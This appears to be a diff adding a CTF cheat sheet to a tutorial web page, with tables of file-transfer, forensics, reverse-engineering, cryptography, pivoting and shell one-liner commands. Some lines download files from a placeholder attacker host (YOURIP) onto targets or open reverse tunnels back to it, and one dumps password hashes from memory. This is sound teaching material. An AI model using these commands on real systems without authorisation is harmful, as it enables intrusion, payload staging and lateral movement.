+            <tr><td><code>bloodhound-python -c all -u user -p pass -d domain -ns DC</code></td><td class="k-desc">Collect AD data for BloodHound</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ File Transfers ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-exchange-alt"></i> File Transfers</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Method</th><th>Command</th></tr></thead>
+          <tbody>
+            <tr><td class="k-desc"><strong>Python HTTP server</strong></td><td><code>python3 -m http.server 8080</code></td></tr>
+            <tr><td class="k-desc"><strong>wget (Linux target)</strong></td><td><code>wget http://YOURIP:8080/file -O /tmp/file</code></td></tr>
+            <tr><td class="k-desc"><strong>curl (Linux target)</strong></td><td><code>curl http://YOURIP:8080/file -o /tmp/file</code></td></tr>
+            <tr><td class="k-desc"><strong>Netcat send</strong></td><td><code>nc -lvnp 4444 < file</code> (sender) → <code>nc YOURIP 4444 > file</code> (receiver)</td></tr>
+            <tr><td class="k-desc"><strong>PowerShell download</strong></td><td><code>Invoke-WebRequest -Uri http://YOURIP:8080/file -OutFile C:\temp\file</code></td></tr>
+            <tr><td class="k-desc"><strong>PowerShell (short)</strong></td><td><code>iwr http://YOURIP:8080/file -o C:\temp\file</code></td></tr>
+            <tr><td class="k-desc"><strong>Certutil (Windows)</strong></td><td><code>certutil -urlcache -split -f http://YOURIP:8080/file C:\temp\file</code></td></tr>
+            <tr><td class="k-desc"><strong>SCP</strong></td><td><code>scp file user@target:/tmp/file</code></td></tr>
+            <tr><td class="k-desc"><strong>Base64 encode/decode</strong></td><td><code>base64 file > encoded.txt</code> → transfer → <code>base64 -d encoded.txt > file</code></td></tr>
+            <tr><td class="k-desc"><strong>SMB server (Impacket)</strong></td><td><code>impacket-smbserver share . -smb2support</code> → <code>copy \\YOURIP\share\file .</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Forensics & Steganography ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-microscope"></i> Forensics &amp; Steganography</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>file mystery_file</code></td><td class="k-desc">Identify file type from magic bytes</td></tr>
+            <tr><td><code>strings -n 8 file</code></td><td class="k-desc">Extract printable strings (min 8 chars)</td></tr>
+            <tr><td><code>strings -e l file</code></td><td class="k-desc">Extract 16-bit little-endian strings</td></tr>
+            <tr><td><code>xxd file | head -50</code></td><td class="k-desc">Hex dump — first 50 lines</td></tr>
+            <tr><td><code>hexdump -C file | head</code></td><td class="k-desc">Hex + ASCII dump</td></tr>
+            <tr><td><code>binwalk file</code></td><td class="k-desc">Scan for embedded files/signatures</td></tr>
+            <tr><td><code>binwalk -e file</code></td><td class="k-desc">Extract embedded files</td></tr>
+            <tr><td><code>binwalk --dd=".*" file</code></td><td class="k-desc">Force extract all detected types</td></tr>
+            <tr><td><code>foremost -i file -o output/</code></td><td class="k-desc">Carve files from binary data</td></tr>
+            <tr><td><code>steghide info image.jpg</code></td><td class="k-desc">Check if image has hidden data</td></tr>
+            <tr><td><code>steghide extract -sf image.jpg</code></td><td class="k-desc">Extract hidden data from image</td></tr>
+            <tr><td><code>stegseek image.jpg rockyou.txt</code></td><td class="k-desc">Brute-force steghide password</td></tr>
+            <tr><td><code>zsteg image.png</code></td><td class="k-desc">Detect stego in PNG/BMP (LSB, etc.)</td></tr>
+            <tr><td><code>exiftool image.jpg</code></td><td class="k-desc">Read/write metadata (EXIF, GPS, etc.)</td></tr>
+            <tr><td><code>pngcheck -v image.png</code></td><td class="k-desc">Validate PNG structure, check for errors</td></tr>
+            <tr><td><code>identify -verbose image.png</code></td><td class="k-desc">ImageMagick — detailed image info</td></tr>
+            <tr><td><code>photorec image.dd</code></td><td class="k-desc">Recover files from disk image</td></tr>
+            <tr><td><code>volatility -f mem.dmp imageinfo</code></td><td class="k-desc">Identify memory dump profile</td></tr>
+            <tr><td><code>volatility -f mem.dmp --profile=X pslist</code></td><td class="k-desc">List processes from memory</td></tr>
+            <tr><td><code>volatility -f mem.dmp --profile=X filescan</code></td><td class="k-desc">Scan for file objects in memory</td></tr>
+            <tr><td><code>volatility -f mem.dmp --profile=X hashdump</code></td><td class="k-desc">Extract password hashes from memory</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Reverse Engineering ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-cogs"></i> Reverse Engineering</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>objdump -d binary</code></td><td class="k-desc">Disassemble binary</td></tr>
+            <tr><td><code>objdump -x binary</code></td><td class="k-desc">Display all headers</td></tr>
+            <tr><td><code>readelf -a binary</code></td><td class="k-desc">ELF header info (sections, symbols)</td></tr>
+            <tr><td><code>nm binary</code></td><td class="k-desc">List symbols</td></tr>
+            <tr><td><code>ldd binary</code></td><td class="k-desc">List shared library dependencies</td></tr>
+            <tr><td><code>ltrace ./binary</code></td><td class="k-desc">Trace library calls</td></tr>
+            <tr><td><code>strace ./binary</code></td><td class="k-desc">Trace system calls</td></tr>
+            <tr><td><code>gdb -q ./binary</code></td><td class="k-desc">Start GDB in quiet mode</td></tr>
+            <tr><td><code>gdb: break main</code></td><td class="k-desc">Set breakpoint at main()</td></tr>
+            <tr><td><code>gdb: run</code></td><td class="k-desc">Run the program</td></tr>
+            <tr><td><code>gdb: disas main</code></td><td class="k-desc">Disassemble main function</td></tr>
+            <tr><td><code>gdb: x/20wx $esp</code></td><td class="k-desc">Examine 20 words at stack pointer</td></tr>
+            <tr><td><code>gdb: info registers</code></td><td class="k-desc">Show all register values</td></tr>
+            <tr><td><code>gdb: set {int}0xaddr = value</code></td><td class="k-desc">Write value to memory address</td></tr>
+            <tr><td><code>gdb: pattern create 200</code></td><td class="k-desc">Generate cyclic pattern (pwndbg/GEF)</td></tr>
+            <tr><td><code>gdb: pattern offset $eip</code></td><td class="k-desc">Find offset to EIP overwrite</td></tr>
+            <tr><td><code>r2 -A ./binary</code></td><td class="k-desc">Radare2 — open with analysis</td></tr>
+            <tr><td><code>r2: afl</code></td><td class="k-desc">List functions</td></tr>
+            <tr><td><code>r2: pdf @main</code></td><td class="k-desc">Disassemble main</td></tr>
+            <tr><td><code>r2: VV @main</code></td><td class="k-desc">Visual graph mode</td></tr>
+            <tr><td><code>checksec ./binary</code></td><td class="k-desc">Check binary protections (NX, PIE, canary, RELRO)</td></tr>
+            <tr><td><code>ROPgadget --binary ./binary</code></td><td class="k-desc">Find ROP gadgets</td></tr>
+            <tr><td><code>one_gadget /lib/x86_64-linux-gnu/libc.so.6</code></td><td class="k-desc">Find one-shot execve gadgets in libc</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Cryptography ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-lock"></i> Cryptography</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>echo -n "text" | md5sum</code></td><td class="k-desc">MD5 hash</td></tr>
+            <tr><td><code>echo -n "text" | sha256sum</code></td><td class="k-desc">SHA-256 hash</td></tr>
+            <tr><td><code>echo -n "text" | base64</code></td><td class="k-desc">Base64 encode</td></tr>
+            <tr><td><code>echo "dGV4dA==" | base64 -d</code></td><td class="k-desc">Base64 decode</td></tr>
+            <tr><td><code>echo -n "text" | xxd -p</code></td><td class="k-desc">Convert to hex</td></tr>
+            <tr><td><code>echo "74657874" | xxd -r -p</code></td><td class="k-desc">Convert hex to ASCII</td></tr>
+            <tr><td><code>openssl enc -aes-256-cbc -d -in file.enc -out file.dec</code></td><td class="k-desc">Decrypt AES-256-CBC file</td></tr>
+            <tr><td><code>openssl rsautl -decrypt -inkey priv.pem -in encrypted -out decrypted</code></td><td class="k-desc">RSA decrypt with private key</td></tr>
+            <tr><td><code>openssl rsa -in key.pem -text -noout</code></td><td class="k-desc">Display RSA key details (n, e, d, p, q)</td></tr>
+            <tr><td><code>openssl x509 -in cert.pem -text -noout</code></td><td class="k-desc">Read X.509 certificate details</td></tr>
+            <tr><td><code>gpg -d encrypted.gpg</code></td><td class="k-desc">Decrypt GPG file</td></tr>
+            <tr><td><code>gpg --import key.asc</code></td><td class="k-desc">Import GPG key</td></tr>
+            <tr><td><code>python3 -c "from Crypto.Util.number import *; print(long_to_bytes(0x48656c6c6f))"</code></td><td class="k-desc">Hex integer to bytes (pycryptodome)</td></tr>
+            <tr><td><code>python3 -c "print(int.from_bytes(b'Hello','big'))"</code></td><td class="k-desc">Bytes to integer</td></tr>
+            <tr><td><code>rsactftool.py --publickey pub.pem --private</code></td><td class="k-desc">Attempt RSA key factoring (RsaCtfTool)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Pivoting & Tunneling ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-project-diagram"></i> Pivoting &amp; Tunneling</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>ssh -L 8080:internal:80 user@pivot</code></td><td class="k-desc">Local port forward — access internal:80 via localhost:8080</td></tr>
+            <tr><td><code>ssh -R 8080:localhost:80 user@pivot</code></td><td class="k-desc">Remote port forward — expose your port 80 on pivot:8080</td></tr>
+            <tr><td><code>ssh -D 9050 user@pivot</code></td><td class="k-desc">SOCKS proxy on port 9050</td></tr>
+            <tr><td><code>sshuttle -r user@pivot 10.10.10.0/24</code></td><td class="k-desc">Transparent tunnel to subnet</td></tr>
+            <tr><td><code>chisel server -p 8000 --reverse</code></td><td class="k-desc">Start chisel server (on attacker)</td></tr>
+            <tr><td><code>chisel client YOURIP:8000 R:8080:127.0.0.1:80</code></td><td class="k-desc">Chisel reverse port forward (on target)</td></tr>
+            <tr><td><code>chisel client YOURIP:8000 R:socks</code></td><td class="k-desc">Chisel reverse SOCKS proxy</td></tr>
+            <tr><td><code>ligolo-ng agent -connect YOURIP:11601 -retry -ignore-cert</code></td><td class="k-desc">Ligolo agent on target</td></tr>
+            <tr><td><code>proxychains -q nmap -sT target</code></td><td class="k-desc">Nmap through SOCKS proxy (TCP connect only)</td></tr>
+            <tr><td><code>socat TCP-LISTEN:8080,fork TCP:internal:80</code></td><td class="k-desc">Simple port forward with socat</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ═══ Useful One-Liners ═══ -->
+    <div class="k-cheat-cat">
+      <div class="k-cheat-cat-title"><i class="fas fa-magic"></i> Useful One-Liners</div>
+      <div class="k-card" style="overflow-x:auto;padding:.75rem;">
+        <table class="k-cheat-table">
+          <thead><tr><th>Purpose</th><th>Command</th></tr></thead>
+          <tbody>
+            <tr><td class="k-desc"><strong>Spawn TTY</strong></td><td><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></td></tr>
+            <tr><td class="k-desc"><strong>Full interactive shell</strong></td><td><code>Ctrl+Z</code> → <code>stty raw -echo;fg</code> → <code>reset</code> → <code>export TERM=xterm</code> → <code>stty rows 40 cols 160</code></td></tr>
+            <tr><td class="k-desc"><strong>Simple web server</strong></td><td><code>python3 -m http.server 80</code></td></tr>
+            <tr><td class="k-desc"><strong>Generate SSH key</strong></td><td><code>ssh-keygen -t rsa -b 4096 -f id_rsa</code></td></tr>
+            <tr><td class="k-desc"><strong>Port scan (no nmap)</strong></td><td><code>for p in $(seq 1 65535); do (echo >/dev/tcp/target/$p) 2>/dev/null && echo "$p open"; done</code></td></tr>
+            <tr><td class="k-desc"><strong>Ping sweep (no nmap)</strong></td><td><code>for i in $(seq 1 254); do (ping -c 1 10.10.10.$i | grep "bytes from" &); done</code></td></tr>
+            <tr><td class="k-desc"><strong>Extract .gz wordlist</strong></td><td><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz</code></td></tr>
+            <tr><td class="k-desc"><strong>Convert epoch time</strong></td><td><code>date -d @1609459200</code></td></tr>
+            <tr><td class="k-desc"><strong>URL encode</strong></td><td><code>python3 -c "import urllib.parse;print(urllib.parse.quote('string'))"</code></td></tr>
+            <tr><td class="k-desc"><strong>URL decode</strong></td><td><code>python3 -c "import urllib.parse;print(urllib.parse.unquote('%73%74%72'))"</code></td></tr>
+            <tr><td class="k-desc"><strong>ROT13</strong></td><td><code>echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td></tr>
+            <tr><td class="k-desc"><strong>Quick checksum</strong></td><td><code>md5sum file && sha1sum file && sha256sum file</code></td></tr>
+            <tr><td class="k-desc"><strong>Watch for changes</strong></td><td><code>watch -n 1 'ls -la /tmp'</code></td></tr>
+            <tr><td class="k-desc"><strong>Base64 file</strong></td><td><code>base64 -w 0 binary > b64.txt</code> (transfer, then <code>base64 -d b64.txt > binary</code>)</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="k-tip">
+      <i class="fas fa-bookmark"></i>
+      <div class="k-tip-text"><strong>Bookmark this page!</strong> This cheat sheet covers the most common commands you'll need during CTF competitions. For tool-specific documentation, check the <a href="#essential-tools" style="color:var(--k-accent);font-weight:600;">Essential Tools</a> section above or visit each tool's official documentation.</div>
     </div>
   </section>
 
